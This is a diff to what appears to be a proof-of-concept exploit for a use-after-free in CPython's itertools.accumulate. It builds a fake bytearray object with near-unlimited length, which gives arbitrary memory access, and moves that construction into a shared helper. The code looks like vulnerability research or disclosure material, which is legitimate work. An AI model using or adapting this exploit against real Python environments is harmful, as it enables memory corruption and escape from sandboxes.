@@ -49,6 +49,7 @@ accumulate_next(accumulateobject *lz)
 # which will call the `__radd__` function in `catch` with the freed object (now our evil object) as `other`.
 
 from itertools import accumulate
+from common import evil_bytearray_obj
 
 class evil(bytes):
     lock = False
@@ -80,16 +81,8 @@ class catch:
         mem = other
         return 0xdeadbeef
 
-# setup
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_obj = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
 
 SIZE = 0x100
 acc = accumulate(lst:=[evil(SIZE - 0x18), catch(), None])
